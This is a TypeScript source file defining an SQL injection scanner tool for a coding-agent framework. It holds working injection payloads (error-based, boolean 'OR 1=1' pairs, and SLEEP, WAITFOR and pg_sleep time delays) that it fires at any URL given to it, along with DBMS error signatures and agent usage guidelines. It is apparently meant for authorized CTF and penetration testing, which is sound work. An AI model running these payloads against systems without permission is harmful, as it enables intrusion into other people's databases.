import type { ToolDefinition } from "@mariozechner/pi-coding-agent"
import { Type } from "@sinclair/typebox"
import type { Static } from "@sinclair/typebox"

const SqliScanParams = Type.Object({
    url: Type.String({ description: "Target URL to scan for SQL injection (include query params for GET)" }),
    method: Type.Optional(
        Type.Union([Type.Literal("GET"), Type.Literal("POST")], {
            description: "HTTP method (default: GET)",
        }),
    ),
    params: Type.Optional(
        Type.Array(Type.String(), {
            description: "Parameter names to test. Auto-detected from URL query string / POST data if omitted.",
        }),
    ),
    data: Type.Optional(Type.String({ description: "POST body, form-encoded (user=admin&pass=x) or JSON" })),
    headers: Type.Optional(Type.Record(Type.String(), Type.String(), { description: "Extra HTTP headers" })),
    cookies: Type.Optional(Type.String({ description: "Cookie header value" })),
    techniques: Type.Optional(
        Type.Array(Type.Union([Type.Literal("error"), Type.Literal("boolean"), Type.Literal("time")]), {
            description: "Detection techniques to apply (default: error + boolean + time)",
        }),
    ),
    time_threshold: Type.Optional(Type.Number({ description: "Seconds to treat as time-based delay (default: 5)" })),
    timeout: Type.Optional(Type.Number({ description: "Per-request timeout in seconds (default: 15)" })),
})

type SqliScanInput = Static<typeof SqliScanParams>

// ── SQL error fingerprints ──────────────────────────────────────────────────

const SQL_ERROR_SIGNATURES: { pattern: RegExp; dbms: string }[] = [
    { pattern: /SQL syntax.*MySQL|MySQL server version for the right syntax/i, dbms: "MySQL" },
    { pattern: /You have an error in your SQL syntax/i, dbms: "MySQL" },
    { pattern: /Warning.*mysql_|SQLSTATE\[/i, dbms: "MySQL/PDO" },
    { pattern: /PostgreSQL.*ERROR|ERROR.*PostgreSQL/i, dbms: "PostgreSQL" },
    { pattern: /WARNING.*pg_\w+\(\)|pg_query\(\)/i, dbms: "PostgreSQL" },
    { pattern: /Microsoft OLE DB Provider for ODBC|Driver.*SQL[\-_ ]*Server/i, dbms: "MSSQL" },
    { pattern: /\[Microsoft\]\[ODBC SQL Server Driver\]/i, dbms: "MSSQL" },
    { pattern: /Unclosed quotation mark after the character string/i, dbms: "MSSQL" },
    { pattern: /ORA-[0-9]{4,}/i, dbms: "Oracle" },
    { pattern: /Oracle error|Warning.*oci_\w+\(\)/i, dbms: "Oracle" },
    { pattern: /SQLite.*error|unrecognized token|no such column|SQL logic error/i, dbms: "SQLite" },
    { pattern: /Sybase message|Warning.*sybase_/i, dbms: "Sybase" },
    { pattern: /DB2 SQL error|SQLCODE.*DB2/i, dbms: "DB2" },
    { pattern: /Syntax error in query expression|Data type mismatch in criteria/i, dbms: "MS Access" },
]

// ── Payloads ────────────────────────────────────────────────────────────────

const ERROR_PAYLOADS = [
    "'",
    '"',
    "\\",
    "'--",
    '"--',
    "' OR '",
    "') OR ('1'='1",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND 1=1 UNION SELECT NULL--",
]

// [true_payload, false_payload] — true should look like baseline, false should differ
const BOOLEAN_PAIRS: [string, string][] = [
    ["' OR 1=1--", "' OR 1=2--"],
    ["' OR 'x'='x'--", "' OR 'x'='y'--"],
    ['" OR 1=1--', '" OR 1=2--'],
    ["1 OR 1=1--", "1 OR 1=2--"],
    ["' OR 1=1#", "' OR 1=2#"],
    ["' OR 1=1/*", "' OR 1=2/*"],
]

// Each injects a ~5s delay; actual threshold configurable
const TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
]

// ── Types ────────────────────────────────────────────────────────────────────

interface RequestResult {
    status: number
    body: string
    timeMs: number
    error?: string
}

interface Finding {
    param: string
    technique: "error" | "boolean" | "time"
    payload: string
    evidence: string
    dbms?: string
}

// ── HTTP helpers ─────────────────────────────────────────────────────────────

function parseUrlParams(url: string): string[] {
    try {
        return [...new URL(url).searchParams.keys()]
    } catch {
        return []
    }
}

function parseBodyParams(data: string): string[] {
    try {
        const parsed = JSON.parse(data)
        if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
            return Object.keys(parsed)
        }
    } catch {}
    return [...new URLSearchParams(data).keys()]
}

function injectUrlParam(url: string, param: string, payload: string): string {
    const parsed = new URL(url)
    parsed.searchParams.set(param, payload)
    return parsed.toString()
}

function injectBodyParam(data: string, param: string, payload: string): string {
    try {
        const parsed = JSON.parse(data)
        if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
            return JSON.stringify({ ...parsed, [param]: payload })
        }
    } catch {}
    const params = new URLSearchParams(data)
    params.set(param, payload)
    return params.toString()
}

async function request(
    url: string,
    method: "GET" | "POST",
    body: string | undefined,
    headers: Record<string, string>,
    timeoutMs: number,
): Promise<RequestResult> {
    const controller = new AbortController()
    const timer = setTimeout(() => controller.abort(), timeoutMs)
    const start = Date.now()
    try {
        const res = await fetch(url, {
            method,
            headers,
            body: method === "POST" ? body : undefined,
            signal: controller.signal,
        })
        const text = await res.text()
        return { status: res.status, body: text, timeMs: Date.now() - start }
    } catch (err) {
        return { status: 0, body: "", timeMs: Date.now() - start, error: err instanceof Error ? err.message : String(err) }
    } finally {
        clearTimeout(timer)
    }
}

// ── Detection helpers ─────────────────────────────────────────────────────────

function detectErrorSignature(body: string): { matched: boolean; dbms?: string; snippet?: string } {
    for (const sig of SQL_ERROR_SIGNATURES) {
        const match = body.match(sig.pattern)
        if (match) {
            const idx = body.indexOf(match[0])
            const start = Math.max(0, idx - 20)
            const end = Math.min(body.length, idx + match[0].length + 100)
            return {
                matched: true,
                dbms: sig.dbms,
                snippet: body.slice(start, end).replace(/\s+/g, " ").trim(),
            }
        }
    }
    return { matched: false }
}

function booleanDiffers(baseline: RequestResult, trueRes: RequestResult, falseRes: RequestResult): boolean {
    if (trueRes.status !== falseRes.status) return true
    const tLen = trueRes.body.length
    const fLen = falseRes.body.length
    const diff = Math.abs(tLen - fLen)
    if (diff < 20) return false
    const ratio = diff / Math.max(1, Math.min(tLen, fLen))
    // true payload response closer to baseline body size
    const trueCloser = Math.abs(tLen - baseline.body.length) < Math.abs(fLen - baseline.body.length)
    return ratio > 0.1 && trueCloser
}

// ── Core scan logic ──────────────────────────────────────────────────────────

async function scanParam(
    param: string,
    baselineUrl: string,
    baselineBody: string | undefined,
    baseline: RequestResult,
    method: "GET" | "POST",
    headers: Record<string, string>,
    techniques: Set<string>,
    timeThresholdMs: number,
    timeoutMs: number,
): Promise<Finding[]> {
    const findings: Finding[] = []
    const found = new Set<string>() // dedupe by technique

    function urlFor(payload: string): string {
        return method === "GET" ? injectUrlParam(baselineUrl, param, payload) : baselineUrl
    }
    function bodyFor(payload: string): string | undefined {
        if (method === "POST" && baselineBody !== undefined) {
            return injectBodyParam(baselineBody, param, payload)
        }
        return baselineBody
    }

    // Error-based
    if (techniques.has("error") && !found.has("error")) {
        for (const payload of ERROR_PAYLOADS) {
            const res = await request(urlFor(payload), method, bodyFor(payload), headers, timeoutMs)
            if (res.error) continue
            const detection = detectErrorSignature(res.body)
            if (detection.matched) {
                findings.push({
                    param,
                    technique: "error",
                    payload,
                    evidence: `SQL error in response: ${detection.snippet}`,
                    dbms: detection.dbms,
                })
                found.add("error")
                break
            }
        }
    }

    // Boolean-based
    if (techniques.has("boolean") && !found.has("boolean")) {
        for (const [truePayload, falsePayload] of BOOLEAN_PAIRS) {
            const [trueRes, falseRes] = await Promise.all([
                request(urlFor(truePayload), method, bodyFor(truePayload), headers, timeoutMs),
                request(urlFor(falsePayload), method, bodyFor(falsePayload), headers, timeoutMs),
            ])
            if (trueRes.error || falseRes.error) continue
            if (booleanDiffers(baseline, trueRes, falseRes)) {
                const tLen = trueRes.body.length
                const fLen = falseRes.body.length
                findings.push({
                    param,
                    technique: "boolean",
                    payload: `${truePayload} / ${falsePayload}`,
                    evidence: `Response differs: true=${tLen}B (status ${trueRes.status}), false=${fLen}B (status ${falseRes.status}), baseline=${baseline.body.length}B`,
                })
                found.add("boolean")
                break
            }
        }
    }

    // Time-based
    if (techniques.has("time") && !found.has("time")) {
        for (const payload of TIME_PAYLOADS) {
            const res = await request(urlFor(payload), method, bodyFor(payload), headers, timeoutMs + timeThresholdMs * 1000)
            if (res.error) continue
            if (res.timeMs >= timeThresholdMs) {
                findings.push({
                    param,
                    technique: "time",
                    payload,
                    evidence: `Response delayed ${(res.timeMs / 1000).toFixed(1)}s (threshold ${(timeThresholdMs / 1000).toFixed(0)}s)`,
                })
                found.add("time")
                break
            }
        }
    }

    return findings
}

function buildSummary(url: string, params: string[], findings: Finding[], elapsedMs: number): string {
    const lines: string[] = []
    lines.push(`# SQL Injection Scan Results`)
    lines.push(`Target: ${url}`)
    lines.push(`Params tested: ${params.join(", ") || "(none)"}`)
    lines.push(`Elapsed: ${(elapsedMs / 1000).toFixed(1)}s`)
    lines.push("")

    if (findings.length === 0) {
        lines.push("No SQL injection vulnerabilities detected.")
        return lines.join("\n")
    }

    lines.push(`## Findings (${findings.length})`)
    for (const f of findings) {
        lines.push("")
        lines.push(`### [${f.technique.toUpperCase()}] param: \`${f.param}\`${f.dbms ? ` (${f.dbms})` : ""}`)
        lines.push(`Payload: \`${f.payload}\``)
        lines.push(`Evidence: ${f.evidence}`)
    }

    return lines.join("\n")
}

// ── Tool definition ──────────────────────────────────────────────────────────

export const sqliScannerTool: ToolDefinition = {
    name: "sqli_scan",
    label: "SQL Injection Scanner",
    description:
        "Automated SQL injection scanner. Tests URL/POST parameters using error-based, boolean-based, and time-based detection techniques. Intended for authorized CTF and penetration testing targets.",
    promptSnippet: "sqli_scan: test URL/POST params for SQL injection (error/boolean/time-based)",
    promptGuidelines: [
        "Use sqli_scan when a web target accepts user-controlled parameters and may be backed by a SQL database.",
        "Start with error technique for speed; add boolean/time when error yields nothing.",
        "Always specify only parameters that are actually under test to avoid noise.",
    ],
    parameters: SqliScanParams,
    async execute(_toolCallId, params: SqliScanInput, signal) {
        const method = params.method ?? "GET"
        const timeThresholdMs = (params.time_threshold ?? 5) * 1000
        const timeoutMs = (params.timeout ?? 15) * 1000
        const techniques = new Set(params.techniques ?? ["error", "boolean", "time"])

        const baseHeaders: Record<string, string> = {
            "User-Agent": "Mozilla/5.0 (compatible; SQLiScanner/1.0)",
            ...params.headers,
        }
        if (params.cookies) baseHeaders["Cookie"] = params.cookies
        if (method === "POST") {
            baseHeaders["Content-Type"] = params.data?.trimStart().startsWith("{")
                ? "application/json"
                : "application/x-www-form-urlencoded"
        }

        // Resolve parameter list
        let testParams = params.params ?? []
        if (testParams.length === 0) {
            testParams = method === "GET" ? parseUrlParams(params.url) : params.data ? parseBodyParams(params.data) : []
        }
        if (testParams.length === 0) {
            return {
                content: [{ type: "text", text: "No parameters to test. Provide `params` explicitly or include query params in the URL." }],
                details: { url: params.url, findings: [] },
            }
        }

        // Baseline request
        const baseline = await request(params.url, method, params.data, baseHeaders, timeoutMs)
        if (baseline.error) {
            return {
                content: [{ type: "text", text: `Baseline request failed: ${baseline.error}` }],
                details: { url: params.url, findings: [] },
            }
        }

        const start = Date.now()
        const allFindings: Finding[] = []

        for (const param of testParams) {
            if (signal?.aborted) break
            const findings = await scanParam(
                param,
                params.url,
                params.data,
                baseline,
                method,
                baseHeaders,
                techniques,
                timeThresholdMs,
                timeoutMs,
            )
            allFindings.push(...findings)
        }

        const summary = buildSummary(params.url, testParams, allFindings, Date.now() - start)

        return {
            content: [{ type: "text", text: summary }],
            details: {
                url: params.url,
                method,
                params_tested: testParams,
                baseline_status: baseline.status,
                baseline_length: baseline.body.length,
                findings: allFindings,
            },
        }
    },
}
